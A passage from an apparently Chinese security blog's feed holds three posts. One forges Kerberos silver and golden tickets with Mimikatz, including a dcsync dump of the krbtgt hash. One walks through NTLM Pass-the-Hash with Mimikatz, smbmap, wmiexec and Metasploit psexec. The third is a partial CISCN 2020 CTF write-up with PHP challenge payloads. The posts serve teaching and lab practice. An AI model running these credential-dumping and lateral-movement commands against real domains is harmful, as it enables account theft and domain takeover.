key</code>)，并发还给客户端。</p></li><li><p>客户端将服务请求与该<code>ticket</code>一并发送给相应的服务端即可。</p></li></ol><h2 id="0x02-Kerberos协议具体流程"><a href="#0x02-Kerberos协议具体流程" class="headerlink" title="0x02 Kerberos协议具体流程"></a>0x02 Kerberos协议具体流程</h2><h3 id="用户登陆"><a href="#用户登陆" class="headerlink" title="用户登陆"></a>用户登陆</h3><p><strong>用户使用客户端上的程序进行登陆</strong>。</p><p>用户需要在客户端上输入用户<code>ID</code>与密码，客户端程序运行一个单向函数(<code>One-way function</code>)把密码转换成密钥，这个就是客户端(<code>Client</code>)的用户密钥(<code>user&#39;s secret key</code>)。</p><h3 id="客户端认证"><a href="#客户端认证" class="headerlink" title="客户端认证"></a>客户端认证</h3><p><strong>客户端(<code>Client</code>)从认证服务器(<code>AS</code>)获取票据授权票据<code>Ticket Granting Ticket</code>简称<code>TGT</code>。</strong></p><ol><li><p>客户端向<code>AS</code>发送一条明文信息，用以申请对某服务的访问。</p><p>但是这里用户不向<code>AS</code>发送用户密钥(<code>user&#39;s secret key</code>)，也不发送密码，该<code>AS</code>能够从本地数据库中查询到该申请用户的密码，并通过与客户端相同的途径转换成相同的用户密钥(<code>user&#39;s secret key</code>)。</p></li><li><p><code>AS</code>检查该用户<code>ID</code>是否存在于本地数据库中，如果存在则返回两条信息：</p><ul><li><p><code>Client/TGS</code>会话密钥(<code>Client/TGS Session Key</code>)，该<code>Session Key</code>用在将来<code>Client</code>与<code>TGS</code>的通信上，并通过用户密钥(<code>user&#39;s secret key</code>)进行加密。</p></li><li><p>票据授权票据(<code>TGT</code>)，<code>TGT</code>包括：<code>Client/TGS会话密钥</code>，用户<code>ID</code>，用户网址，<code>TGT</code>有效期，并通过<code>TGS</code>密钥(<code>TGS&#39;s secret key</code>)进行加密。</p></li></ul></li><li><p>当<code>Client</code>收到上一步的两条消息后，<code>Client</code>首先尝试用自己的用户密钥(<code>user&#39;s secret key</code>)解密<code>Client/TGS会话密钥</code>，如果用户输入的密码与<code>AS</code>数据库中的密码不符，则不能成功解密。输入正确的密码并通过随之生成的<code>user&#39;s secret key</code>才能解密，从而得到<code>Client/TGS会话密钥</code>。</p></li></ol><h3 id="服务授权"><a href="#服务授权" class="headerlink" title="服务授权"></a>服务授权</h3><p><strong><code>Client</code>从<code>TGS</code>获取票据(<code>client-to-server ticket</code>)</strong></p><ol><li><p>当<code>Client</code>需要申请特定服务时，会向<code>TGS</code>发送以下两条消息：</p><ul><li><code>AS</code>向<code>Client</code>返回的票据授权票据<code>TGT</code>，以及需要获取服务的服务<code>ID</code>。</li><li>认证符(<code>Authenticator</code>)，其包括：用户<code>ID</code>，时间戳，并通过<code>Client/TGS会话密钥</code>进行加密。</li></ul></li><li><p>收到以上两条消息后，<code>TGS</code>首先检查<code>KDC</code>数据库中是否存在所需的服务，查找到之后，<code>TGS</code>用自己的TGS密钥(<code>TGS&#39;s secret key</code>)解密<code>TGT</code>，从而得到之前生成的<code>Client/TGS会话密钥</code>。<code>TGS</code>再用这个会话密钥解密得到包含用户<code>ID</code>和时间戳的<code>Authenticator</code>，并对<code>TGT</code>和<code>Authenticator</code>进行验证，验证通过之后返回两条消息：</p><ul><li><code>Client-Server</code>票据(<code>client-to-server ticket</code>)，该票据包括：<code>Client/SS</code>会话密钥 (<code>Client/Server Session Key</code>），用户<code>ID</code>，用户网址，有效期），并通过提供该服务的服务器密钥(<code>service&#39;s secret key</code>)进行加密。</li><li><code>Client/SS</code>会话密钥(<code>Client/Server Session Key</code>)，该会话密钥用在将来<code>Client</code>与<code>Server Service</code>的通信上，并通过<code>Client/TGS</code>会话密钥(<code>Client/TGS Session Key</code>)进行加密。</li></ul></li><li><p><code>Client</code>收到这些消息后，用<code>Client/TGS</code>会话密钥(<code>Client/TGS Session Key</code>)解密得到<code>Client/SS</code>会话密钥(<code>Client/Server Session Key</code>)。</p></li></ol><h3 id="服务请求"><a href="#服务请求" class="headerlink" title="服务请求"></a>服务请求</h3><p><strong><code>Client</code>从<code>Server</code>获取服务</strong></p><ol><li>当获得<code>Client/SS</code>会话密钥(<code>Client/Server Session Key</code>)之后，<code>Client</code>就能够使用服务器提供的服务了。<code>Client</code>向指定服务器<code>Server</code>发出两条消息：<ul><li>上一步的<code>Client-Server</code>票据(<code>client-to-server ticket</code>)，并通过服务器密钥(<code>service&#39;s secret key</code>)进行加密。</li><li>新的<code>Authenticator</code>包括：用户<code>ID</code>，时间戳，并通过<code>Client/SS</code>会话密钥(<code>Client/Server Session Key</code>)进行加密。</li></ul></li><li><code>Server</code>用自己的密钥<code>service&#39;s secret key</code>解密<code>Client-Server</code>票据得到<code>TGS</code>提供的<code>Client/SS</code>会话密钥<code>Client/Server Session Key</code>。再用这个会话密钥解密得到新的<code>Authenticator</code>，再对<code>Ticket</code>和<code>Authenticator</code>进行验证，验证通过则返回一条消息：<ul><li>新时间戳，新时间戳是：<code>Client</code>发送的时间戳加<code>1</code>(<code>Kerberos</code>版本<code>5</code>已经取消这一做法），并通过<code>Client/SS</code>会话密钥(<code>Client/Server Session Key</code>)进行加密。</li></ul></li><li><code>Client</code>通过<code>Client/SS</code>会话密钥(<code>Client/Server Session Key</code>)解密得到<code>新时间戳</code>并验证其是否正确。验证通过的话则客户端可以信赖服务器，并向服务器<code>Server</code>发送服务请求。</li><li>服务器<code>Server</code>向客户端<code>Client</code>提供相应的服务。</li></ol><p><img src="https://oss.zjun.info/zjun.info/3.webp" alt="3"></p><h2 id="0x03-白银票据Silver-Ticket伪造"><a href="#0x03-白银票据Silver-Ticket伪造" class="headerlink" title="0x03 白银票据Silver Ticket伪造"></a>0x03 白银票据Silver Ticket伪造</h2><p>白银票据伪造的是<code>TGS</code>的票据，是一个点对点的有效凭证。</p><p>正常情况下一个非域管权限的域内用户访问域控的文件共享是拒绝访问的。</p><p><img src="https://oss.zjun.info/zjun.info/uFHzxmCnGAbjM7J.webp" alt="uFHzxmCnGAbjM7J"></p><p>下面来伪造白银票据来让<code>Client</code>端的该用户具有访问权限：</p><ul><li><p>得到域控管理员<code>NTLM Hash</code>：<code>ec9c6ab085b32841da1a0c61466b959b</code></p><p><img src="https://oss.zjun.info/zjun.info/4.webp" alt="4"></p><p>得到域<code>SID</code>：<code>S-1-5-21-3446166583-1116429469-1279190574</code></p><p><img src="https://oss.zjun.info/zjun.info/5.webp" alt="5"></p><ul><li>当前域名是<code>zjun.com</code>，伪造的用户名为<code>test</code>，服务伪造<code>cifs</code>，需要访问的主机是<code>dc.zjun.com</code>，在<code>Client</code>利用<code>Mimikatz</code>执行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden &#x2F;domain:zjun.com &#x2F;sid:S-1-5-21-3446166583-1116429469-1279190574 &#x2F;target:dc.zjun.com &#x2F;rc4:ec9c6ab085b32841da1a0c61466b959b &#x2F;service:cifs &#x2F;user:test &#x2F;ptt</span><br><span class="line"></span><br><span class="line">&#x2F;domain: 域名称 </span><br><span class="line">&#x2F;sid: 域SID </span><br><span class="line">&#x2F;target: 目标主机名 </span><br><span class="line">&#x2F;service: 服务类型 </span><br><span class="line">&#x2F;rc4: 用户NTLM hash</span><br><span class="line">&#x2F;user: 伪造的随意用户名 </span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/6.webp" alt="6"></p><p>可以看到内存中已经有了票据</p></li></ul><p><img src="https://oss.zjun.info/zjun.info/7.webp" alt="7"></p><p>现在也有了权限访问<code>DC</code>的文件共享了</p><p><img src="https://oss.zjun.info/zjun.info/8.webp" alt="8"></p><p>也可以利用<code>psexec</code>弹回<code>cmd</code></p><p><img src="https://oss.zjun.info/zjun.info/9.webp" alt="9"></p><h2 id="0x04-黄金票据Golden-Ticket伪造"><a href="#0x04-黄金票据Golden-Ticket伪造" class="headerlink" title="0x04 黄金票据Golden Ticket伪造"></a>0x04 黄金票据Golden Ticket伪造</h2><p>黄金票据伪造的是<code>TGT</code>，是一个任意服务的认证凭据。</p><p>伪造黄金票据最主要得是需要获得<code>krbtgt</code>用户的<code>NTLM hash</code>，在拿下域控后可以抓取<code>kerbtgt</code>的<code>NTLM hash</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="built_in">log</span> <span class="string">&quot;lsadump::dcsync /domain:zjun.com /user:krbtgt&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/10.webp" alt="10"></p><p>然后便可容易在域内其他主机或可以访问到域的主机上伪造黄金票据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:zjun.com /sid:S-1-5-21-3446166583-1116429469-1279190574 /krbtgt:66ad458513450343d7625cd1bc6f7262 /ptt</span><br><span class="line"> </span><br><span class="line">/admin：伪造的任意用户名</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：域SID</span><br><span class="line">/krbtgt：krbtgt用户的NTLM <span class="built_in">hash</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/11.webp" alt="11"></p><p>可以很隐蔽的控制整个域环境。</p><p><img src="https://oss.zjun.info/zjun.info/12.webp" alt="12"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> Kerberos </tag>
            
            <tag> 域 </tag>
            
            <tag> Ticket </tag>
            
            <tag> 黄金票据 </tag>
            
            <tag> 白银票据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTLM认证协议到Pass The Hash攻击</title>
      <link href="2020/ntlm-authentication-to-pth-attack.html"/>
      <url>2020/ntlm-authentication-to-pth-attack.html</url>
      
        <content type="html"><![CDATA[<p>NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。</p><a id="more"></a><h2 id="0x01-NTLM协议"><a href="#0x01-NTLM协议" class="headerlink" title="0x01 NTLM协议"></a>0x01 NTLM协议</h2><blockquote><p>In a Windows network, NT (New Technology) LAN Manager (NTLM) is a suite of Microsoft security protocols intended to provide authentication, integrity, and confidentiality to users.NTLM is the successor to the authentication protocol in Microsoft LAN Manager (LANMAN), an older Microsoft product. The NTLM protocol suite is implemented in a Security Support Provider, which combines the LAN Manager authentication protocol, NTLMv1, NTLMv2 and NTLM2 Session protocols in a single package. Whether these protocols are used or can be used on a system is governed by Group Policy settings, for which different versions of Windows have different default settings. NTLM passwords are considered weak because they can be brute-forced very easily with modern hardware.</p></blockquote><p>这段话摘自：</p><p><a href="https://en.wikipedia.org/wiki/NT_LAN_Manager">https://en.wikipedia.org/wiki/NT_LAN_Manager</a></p><p>大概说到<code>NTLM</code>协议是<code>LM</code>（LAN Manager）协议的后继产品，其协议套件中包含<code>LM</code>、<code>NTLM v1</code>、<code>NTLM v2</code>和<code>NTLM2 Session</code>四种协议，具体该使用哪一种由组策略决定。不同版本的<code>Windows</code>版本具有不同的默认设置。其中也提到了<code>NTLM</code>协议是一种不安全的认证模式。</p><p> <code>NTLM</code>基于<code>Challenge/Response</code> （质询/响应）认证机制。整个认证流程分为三部分：<code>协商</code>，<code>质询</code>和<code>身份验证</code>。</p><h3 id="1-协商"><a href="#1-协商" class="headerlink" title="1. 协商"></a>1. 协商</h3><p>客户端向服务器发送协商消息，此消息允许客户端向服务器指定其支持的<code>NTLM</code>选项，其中就包括需要登陆的用户名，协议版本信息，签名等等。可详见官方文档<a href="https://docs.microsoft.com/zh-cn/openspecs/windows_protocols/ms-nlmp/b34032e5-3aae-4bc6-84c3-c6d80eadf7f2">NEGOTIATE_MESSAGE</a></p><h3 id="2-质询"><a href="#2-质询" class="headerlink" title="2. 质询"></a>2. 质询</h3><p>这一个过程中服务器接收到了客户端的协商信息，服务器会产生一个<code>Challenge</code>，之后加密验证会依赖于<code>Challenge</code>。</p><blockquote><p><strong>challenge</strong>: A piece of data used to authenticate a user. Typically a challenge takes the form of a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/780943e9-42e6-4dbe-aa87-1dce828ba82a#gt_001c0e40-0980-417d-853c-f7cb34ba6d3b">nonce</a>.</p></blockquote><p>这是来自微软官方的解释，就是说<code>Challenge</code>是用于验证用户身份的一条数据。通常，<code>Challenge</code>采用随机数的形式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTLM v1这里生成的是8位的Challenge，而NTLM v2是16位的Challenge。</span><br></pre></td></tr></table></figure><p>服务器使用登录用户名对应的<code>NTLM Hash</code>加密<code>Challenge</code>， 得到一个<code>Net NTLM Hash</code>。同时将之前生成的随机数<code>Challenge</code>等信息发送给客户端。</p><p>客户端接受到<code>Challenge</code>后，使用将要登录到账户对应的<code>NTLM Hash</code>加密<code>Challenge</code>生成<code>Response</code>，然后将<code>Response</code>等信息发送至服务器端。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTLM v1这里的加密算法采用DES，NTLM v2采用HMAC-MD5。</span><br></pre></td></tr></table></figure><h3 id="3-身份验证"><a href="#3-身份验证" class="headerlink" title="3. 身份验证"></a>3. 身份验证</h3><p>服务器端接收到客户端发送的<code>Response</code>，将<code>Response</code>与自己计算得出的<code>Net NTLM Hash</code>进行比较，如果相等，则认证通过。</p><p>![1](<a href="https://oss.zjun.info/zjun.info/1">https://oss.zjun.info/zjun.info/1</a> (1).png)</p><h2 id="0x02-Pass-The-Hash攻击"><a href="#0x02-Pass-The-Hash攻击" class="headerlink" title="0x02 Pass The Hash攻击"></a>0x02 Pass The Hash攻击</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1. 原理"></a>1. 原理</h3><p>前面说到了<code>Windows</code>的网络认证，依靠<code>NTLM</code>协议，是一种点对点的认证交互模式，没有类似于<code>Kerberos</code>协议的信托机构。</p><p>并且在验证过程中也是没有使用到明文密码的，可以发现在客户端向服务端发起身份验证中主要的认证步骤在于向服务端发送<code>Response</code>，这意味着在某一种情况下，你在工作组或域环境中拿到了一台主机的权限，并读到了它的<code>NTLM hash</code>或<code>LM hash</code>，这时想要破解出明文密码可能会有难度，所以你选择依靠这个<code>hash</code>，在工作组或域内登陆更多的主机，因为在内网，密码一致的情况非常常见。</p><p>所以你可以伪装成客户端向服务端发起<code>NTLM</code>协议的认证，通过服务端对客户端发送的<code>Challenge</code>再加上你得到的<code>hash</code>，生成一个<code>Response</code>，就可以完整实现整个认证流程。</p><p>这个攻击方式就称为哈希传递（Pass The Hash）。</p><h3 id="2-攻击利用"><a href="#2-攻击利用" class="headerlink" title="2. 攻击利用"></a>2. 攻击利用</h3><p>下面介绍几种利用方式</p><h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/2.png" alt="2"></p><p>利用当前的<code>NTLM hash</code>进行传递：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:zjun.com /ntlm:79c89e2e7418467a4e7b55f8307260ca</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/3.png" alt="3"></p><h4 id="Smbmap"><a href="#Smbmap" class="headerlink" title="Smbmap"></a>Smbmap</h4><p><a href="https://github.com/ShawnDEvans/smbmap">SMBMap</a>是一个<code>SMB</code>枚举工具，功能很强大，可以命令执行，同时也支持哈希传递。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 smbmap.py -u administrator -p <span class="string">&#x27;00000000000000000000000000000000:79c89e2e7418467a4e7b55f8307260ca&#x27;</span> -H 192.168.21.200 -r <span class="string">&#x27;C$\Users&#x27;</span></span><br><span class="line"><span class="comment"># 前面的32个0表示的是LM hash，但是目标主机是win 2012默认不开启LM hash，所以这里随意填入32位长度的字符即可。</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/4.png" alt="4"></p><h4 id="Wmiexec"><a href="#Wmiexec" class="headerlink" title="Wmiexec"></a>Wmiexec</h4><p>python源码：</p><p><a href="https://github.com/SecureAuthCorp/impacket/edit/master/examples/wmiexec.py">https://github.com/SecureAuthCorp/impacket/edit/master/examples/wmiexec.py</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py -hashes 00000000000000000000000000000000:79c89e2e7418467a4e7b55f8307260ca ZJUN/administrator@192.168.21.200 <span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="comment"># 前面的32个0表示的是LM hash，但是目标主机是win 2012默认不开启LM hash，所以这里随意填入32位长度的字符即可。</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/5.png" alt="5"></p><p><code>windows exe</code>版本：</p><p><a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p><p><img src="https://oss.zjun.info/zjun.info/6.png" alt="6"></p><h4 id="Metasploit-psexec模块"><a href="#Metasploit-psexec模块" class="headerlink" title="Metasploit psexec模块"></a>Metasploit psexec模块</h4><p>直接<code>hash</code>喷射整个内网段不免缓慢，由于其依赖于<code>445</code>或<code>139</code>等端口，所以可以先扫一下段内端口开放主机。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.21.0/24</span><br><span class="line"><span class="built_in">set</span> threads 100</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/7.png" alt="7"></p><p>再利用<code>psexec</code>模块进行哈希传递。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.0.102</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.21.200</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass 00000000000000000000000000000000:79c89e2e7418467a4e7b55f8307260ca</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/8.png" alt="8"></p><p>此外还有如<a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a>、<a href="https://github.com/brav0hax/smbexec">smbexec</a>等工具。</p><p>对于这一缺陷，微软发布了<code>KB2871997</code>补丁，在打了该补丁后，对于<code>SID</code>非<code>500</code>的账户，无论用户名，<code>Pass The Hash</code>无法成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/9.png" alt="9"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 网络认证 </tag>
            
            <tag> NTLM </tag>
            
            <tag> PTH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN 2020 线上初赛部分WriteUp</title>
      <link href="2020/ciscn-2020-preliminaries.html"/>
      <url>2020/ciscn-2020-preliminaries.html</url>
      
        <content type="html"><![CDATA[<p>这次比赛分为在线知识问答和ctf，这里是我们IRISES队伍的ctf writeup。可惜的是队内没有pwn手，而且web方向的题也没有偏向实战类型，导致pwn直接没看，挺尴尬的一场比赛。</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="0x01-easyphp"><a href="#0x01-easyphp" class="headerlink" title="0x01 easyphp"></a>0x01 easyphp</h3><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//题目环境：php:7.4.8-apache</span></span><br><span class="line">    <span class="variable">$pid</span> = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span> == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;could not fork&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$pid</span>)&#123;</span><br><span class="line">        <span class="variable">$r</span>=pcntl_wait(<span class="variable">$status</span>);</span><br><span class="line">        <span class="keyword">if</span>(!pcntl_wifexited(<span class="variable">$status</span>))&#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;is_string(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">            call_user_func_array(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],[<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>回调一个存在的函数，然后让进程退出即可拿到phpinfo()。</p><p>Payload: </p><p><code>?a=call_user_func&amp;&amp;b=pcntl_wait</code></p><h3 id="0x02-easytrick"><a href="#0x02-easytrick" class="headerlink" title="0x02 easytrick"></a>0x02 easytrick</h3><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;你太长了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;trick&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span> (strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;你太长了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> trick();</span><br><span class="line"><span class="variable">$obj</span>-&gt;trick1 = <span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line"><span class="variable">$obj</span>-&gt;trick2 = INF;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$obj</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:5:&quot;trick&quot;:2:&#123;s:6:&quot;trick1&quot;;d:INF;s:6:&quot;trick2&quot;;d:INF;&#125;</span></span><br></pre></td></tr></table></figure><p><code>string 1/0</code>会直接转化为<code>INF</code>，可绕过长度与第二个if判断限制。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0x01-签到"><a href="#0x01-签到" class="headerlink" title="0x01 签到"></a>0x01 签到</h3><p>点进去后记录IP，每个省份记录10个IP以上即可出现flag。</p><h3 id="0x02-the-best-ctf-game"><a href="#0x02-the-best-ctf-game" class="headerlink" title="0x02 the_best_ctf_game"></a>0x02 the_best_ctf_game</h3><p>解压后出现一个flag的文件，对其进行hex分析。</p><p><img src="https://oss.zjun.info/zjun.info/ciscn2020-1.png" alt="ciscn2020-1"></p><p>仔细观察即可发现其中夹杂着flag字样，手动去除多余字符即可。</p><h3 id="0x03-电脑被黑"><a href="#0x03-电脑被黑" class="headerlink" title="0x03 电脑被黑"></a>0x03 电脑被黑</h3><p>通过R-Studio扫描此镜像文件发现是Linux系统，且扫描出部分丢失文件</p><p><img src="https://oss.zjun.info/zjun.info/ciscn2020-2.png" alt="ciscn2020-2"></p><p><img src="https://oss.zjun.info/zjun.info/ciscn2020-3.png" 